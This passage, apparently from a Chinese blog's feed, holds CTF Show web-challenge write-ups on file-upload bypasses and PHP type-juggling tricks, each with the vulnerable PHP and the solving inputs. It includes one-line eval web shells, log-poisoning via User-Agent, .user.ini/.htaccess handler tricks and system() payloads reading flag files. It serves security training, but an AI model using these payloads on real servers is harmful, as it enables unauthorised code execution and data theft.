application/x-httpd-php&lt;/FilesMatch&gt;SetHandler application/x-httpd-php#所有文件后缀都当作 php 文件处理</span><br></pre></td></tr></table></figure></li></ul></li><li><p>.user.ini 注意该目录下是否已经含有 .php 文件</p></li><li><p>过滤 php </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 大小写绕过# 短标签</span></span><br></pre></td></tr></table></figure><p>过滤 []</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#123;&#125; 绕过</span></span><br></pre></td></tr></table></figure></li><li><p>过滤 分号 ;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 命令执行&lt;? system(&quot;nl ../f*&quot;)?&gt;&lt;?=(system(&#x27;nl ../f*&#x27;))?&gt;&lt;?= `nl ../*.p*`?&gt;&lt;?= `nl ../f*`?&gt;&lt;?=(system(&#x27;tac ../f*&#x27;))?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>日志包含 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤 <span class="built_in">log</span>  Web 160<span class="comment"># 上传 .user.iniauto_prepend_file=123.png# 上传 123.png，在其中进行拼接# nginx 服务器&lt;?=include&quot;/var/log/nginx/access.log&quot;?&gt;# 由于 log 被过滤，进行拼接&lt;?=include&quot;/var/l&quot;.&quot;og/nginx/access.l&quot;.&quot;og&quot;?&gt;# 访问 /upload/index.php 抓包在 User-Agent 中添加恶意代码 &lt;?php system(&#x27;cat ../flag.php&#x27;); ?&gt; ，访问</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">未过滤 <span class="built_in">log</span>  Web 169 170<span class="comment"># 上传 .user.iniauto_prepend_file=/var/log/nginx/access.log# 上传 .php 文件，同时 User-Agent 写入 代码 &lt;?php phpinfo(); ?&gt;&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt;内容随意# 访问，命令执行</span></span><br></pre></td></tr></table></figure></li><li><p>.user.ini 上传不了？尝试文件头写入 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure></li><li><p>过滤 <code>.</code>  Web 162-163</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 即不能包含日志文件，则包含 session 文件# 上传 .user.iniGIF89aauto_prepend_file=test# 上传 testGIF89a&lt;?=include&quot;/tmp/sess_test&quot;?&gt;# 构造 POST 数据包&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://e2f78cd5-b2b8-40b9-8104-7dc18214350b.challenge.ctf.show:8080/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;# 任意上传文件，抓包修改，PHPSESSID=test，写入代码添入变量 Numbers 爆破# 访问 /upload/index.php 添入变量 Numbers 同时爆破</span></span><br></pre></td></tr></table></figure></li><li><p>二次渲染  Web 164 165</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">png 图片<span class="comment"># 脚本生成图片上传，访问，命令执行 &lt;?=$_GET[0]($_POST[1]);?&gt;# 下载至本地查看（文件包含）</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpg 图片<span class="comment"># 直接上传 jpg 图片，下载回来，使用脚本处理，得到新的 jpg 图片，再次上传# 下载至本地查看（文件包含）</span></span><br></pre></td></tr></table></figure></li><li><p>后缀类型不可猜测时，.zip 文件上传 Web 166</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传 .zip 文件抓包 Content-Type: application/x-zip-compressed# 内容直接是恶意代码# 找到 .zip 文件路径，进行查看# 命令执行</span></span><br></pre></td></tr></table></figure></li><li><p>免杀 Web 168</p></li><li><p>前端做后缀检测，后端做不同后缀的 Content-Type 检测</p><p>注意抓包后修改 Content-Type 为白名单</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;CTF Show 文件上传篇。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF Show" scheme="https://xizhi-future.github.io/categories/CTF-Show/"/>
    
    
    <category term="CTF" scheme="https://xizhi-future.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-Show-PHP特性</title>
    <link href="https://xizhi-future.github.io/2021/10/01/CTF-Show-PHP%E7%89%B9%E6%80%A7/"/>
    <id>https://xizhi-future.github.io/2021/10/01/CTF-Show-PHP%E7%89%B9%E6%80%A7/</id>
    <published>2021-10-01T11:15:08.000Z</published>
    <updated>2021-10-01T11:16:09.641Z</updated>
    
    <content type="html"><![CDATA[<p>CTF Show PHP 特性篇。</p><span id="more"></span><h1 id="一、CTF-Show-PHP特性"><a href="#一、CTF-Show-PHP特性" class="headerlink" title="一、CTF Show PHP特性"></a>一、CTF Show PHP特性</h1><h2 id="1-1-Web-89-—-intval-数组-绕过"><a href="#1-1-Web-89-—-intval-数组-绕过" class="headerlink" title="1.1 Web 89 — intval 数组 [ ] 绕过"></a>1.1 Web 89 — intval 数组 [ ] 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]=1<span class="comment">#数组绕过</span></span><br></pre></td></tr></table></figure><h2 id="1-2-Web-90-—-intval-取整-—-intval-‘4476sasaS’-0-4476"><a href="#1-2-Web-90-—-intval-取整-—-intval-‘4476sasaS’-0-4476" class="headerlink" title="1.2 Web 90 — intval 取整 — intval(‘4476sasaS’,0)===4476"></a>1.2 Web 90 — intval 取整 — intval(‘4476sasaS’,0)===4476</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">intval ( mixed <span class="variable">$var</span> [, int <span class="variable">$base</span> = 10 ] ) : int</span><br><span class="line"></span><br><span class="line">Note:</span><br><span class="line">如果 base 是 0，通过检测 var 的格式来决定使用的进制：</span><br><span class="line">如果字符串包括了 <span class="string">&quot;0x&quot;</span> (或 <span class="string">&quot;0X&quot;</span>) 的前缀，使用 16 进制 (hex)；否则，</span><br><span class="line">如果字符串以 <span class="string">&quot;0&quot;</span> 开始，使用 8 进制(octal)；</span><br><span class="line">否则，</span><br><span class="line">将使用 10 进制 (decimal)。</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">intval(<span class="string">&#x27;4476.0&#x27;</span>)===4476    小数点  </span><br><span class="line">intval(<span class="string">&#x27;+4476.0&#x27;</span>)===4476   正负号</span><br><span class="line">intval(<span class="string">&#x27;4476e0&#x27;</span>)===4476    科学计数法</span><br><span class="line">intval(<span class="string">&#x27;0x117c&#x27;</span>)===4476    16进制</span><br><span class="line">intval(<span class="string">&#x27;010574&#x27;</span>)===4476    8进制</span><br><span class="line">intval(<span class="string">&#x27; 010574&#x27;</span>)===4476   8进制+空格</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(intval(<span class="string">&#x27;4476sasaS&#x27;</span>,0)===4476)&#123;</span><br><span class="line">       <span class="built_in">echo</span> <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=4476asd</span><br></pre></td></tr></table></figure><h2 id="1-3-Web-91-—-正则绕过-—-m-换行匹配"><a href="#1-3-Web-91-—-正则绕过-—-m-换行匹配" class="headerlink" title="1.3 Web 91 — 正则绕过 — /m 换行匹配"></a>1.3 Web 91 — 正则绕过 — /m 换行匹配</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">Notice: Undefined index: cmd in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br><span class="line">nonononono</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解析换行之后要匹配到 php不换行不能匹配到 php</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i 不区分(ignore)大小写m多(more)行匹配若存在换行\n并且有开始^或结束$符的情况下，将以换行为分隔符，逐行进行匹配<span class="variable">$str</span> = <span class="string">&quot;abc\nabc&quot;</span>;<span class="variable">$preg</span> = <span class="string">&quot;/^abc$/m&quot;</span>;preg_match(<span class="variable">$preg</span>, <span class="variable">$str</span>,<span class="variable">$matchs</span>);这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。s特殊字符圆点 . 中包含换行符默认的圆点 . 是匹配除换行符 \n 之外的任何单字符，加上s之后, .包含换行符<span class="variable">$str</span> = <span class="string">&quot;abggab\nacbs&quot;</span>;<span class="variable">$preg</span> = <span class="string">&quot;/b./s&quot;</span>;preg_match_all(<span class="variable">$preg</span>, <span class="variable">$str</span>,<span class="variable">$matchs</span>);这样匹配到的有三个 <span class="built_in">bg</span> b\n bsA强制从目标字符串开头匹配;D如果使用$限制结尾字符,则不允许结尾有换行; e配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接使用换行符号分割即可# %0a 是 换行符?cmd=%0aphp</span></span><br></pre></td></tr></table></figure><h2 id="1-4-Web-92-—-intval-可解析十六进制、八进制"><a href="#1-4-Web-92-—-intval-可解析十六进制、八进制" class="headerlink" title="1.4 Web 92 — intval 可解析十六进制、八进制"></a>1.4 Web 92 — intval 可解析十六进制、八进制</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;<span class="keyword">else</span>&#123;        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=0x117c<span class="comment">#十六进制 Hex?num=010574#八进制 oct?num=%20010574# ?num=4476sqs 不行，由于 $num==4476</span></span><br></pre></td></tr></table></figure><h2 id="1-5-Web-93-—-八进制不含字母，十六进制含字母"><a href="#1-5-Web-93-—-八进制不含字母，十六进制含字母" class="headerlink" title="1.5 Web 93 — 八进制不含字母，十六进制含字母"></a>1.5 Web 93 — 八进制不含字母，十六进制含字母</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;<span class="keyword">else</span>&#123;        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=010574<span class="comment">#oct</span></span><br></pre></td></tr></table></figure><h2 id="1-6-Web-94-—-正则绕过-—-20-0a"><a href="#1-6-Web-94-—-正则绕过-—-20-0a" class="headerlink" title="1.6 Web 94 — 正则绕过 — %20  %0a"></a>1.6 Web 94 — 正则绕过 — <code>%20  %0a</code></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#0在其中的位置不能是0，即最开始，即不能以0开头?num=%0a010574?num=4476.0?num=%20010574</span></span><br></pre></td></tr></table></figure><h2 id="1-7-Web-95-—-正则绕过"><a href="#1-7-Web-95-—-正则绕过" class="headerlink" title="1.7 Web 95 — 正则绕过"></a>1.7 Web 95 — 正则绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);    &#125;    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);    &#125;    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=%0a010574?num=%20010574?num=+010574</span><br></pre></td></tr></table></figure><h2 id="1-8-Web-96-—-路径书写"><a href="#1-8-Web-96-—-路径书写" class="headerlink" title="1.8 Web 96 — 路径书写"></a>1.8 Web 96 — 路径书写</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);    &#125;<span class="keyword">else</span>&#123;        highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);    &#125;&#125; </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=./flag.php<span class="comment">#路径?u=/var/www/html/flag.php?u=php://filter/resource=flag.php</span></span><br></pre></td></tr></table></figure><h2 id="1-9-Web-97-—-md5-数组-绕过-—-if-POST-39-a-39-POST-39-b-39-amp-amp-md5-POST-39-a-39-md5-POST-39-b-39"><a href="#1-9-Web-97-—-md5-数组-绕过-—-if-POST-39-a-39-POST-39-b-39-amp-amp-md5-POST-39-a-39-md5-POST-39-b-39" class="headerlink" title="1.9 Web 97 — md5 数组 [ ] 绕过 — if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))"></a>1.9 Web 97 — md5 数组 [ ] 绕过 — <code>if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))</code></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;<span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])<span class="keyword">if</span> (md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))<span class="keyword">echo</span> <span class="variable">$flag</span>;elseprint <span class="string">&#x27;Wrong.&#x27;</span>;&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure><h2 id="1-10-Web-98-—-三目运算符、变量覆盖"><a href="#1-10-Web-98-—-三目运算符、变量覆盖" class="headerlink" title="1.10 Web 98 — 三目运算符、变量覆盖"></a>1.10 Web 98 — 三目运算符、变量覆盖</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#三目运算符以及变量覆盖若GET传参，POST值将覆盖GET值</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get传参：?flag=1post传参：?HTTP_FLAG=flag</span><br></pre></td></tr></table></figure><h2 id="1-11-Web-99-—-file-put-contents"><a href="#1-11-Web-99-—-file-put-contents" class="headerlink" title="1.11 Web 99 — file_put_contents"></a>1.11 Web 99 — file_put_contents</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="variable">$allow</span> = <span class="keyword">array</span>();<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123;     array_push(<span class="variable">$allow</span>, rand(<span class="number">1</span>,<span class="variable">$i</span>));&#125;<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; in_array(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;    file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/17/fi76py2toXNEksO.png" alt="image-20210717144542465"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当没有第三个参数时，in_array之中的比较与 == 一致当第三个参数为 <span class="literal">true</span> 时，in_array之中的比较与 === 一致<span class="variable">$allow</span> = array(1,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>);var_dump(in_array(<span class="string">&#x27;1.php&#x27;</span>,<span class="variable">$allow</span>));<span class="comment">#类型不同，首先转换，返回 true$allow = array(&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;);var_dump(in_array(&#x27;1.php&#x27;,$allow));#类型一致，直接比较，返回false</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?n=1.phpcontent=&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt;</span></span><br></pre></td></tr></table></figure><p>访问 /1.php</p><p><img src="https://i.loli.net/2021/08/05/M8ypxAwW7jNsoP6.png" alt="image-20210805214445932"></p><h2 id="1-12-Web-100-—-eval-“-v2-‘ctfshow’-v3”"><a href="#1-12-Web-100-—-eval-“-v2-‘ctfshow’-v3”" class="headerlink" title="1.12 Web 100 — eval(“$v2(‘ctfshow’)$v3”);"></a>1.12 Web 100 — eval(“$v2(‘ctfshow’)$v3”);</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">include</span>(<span 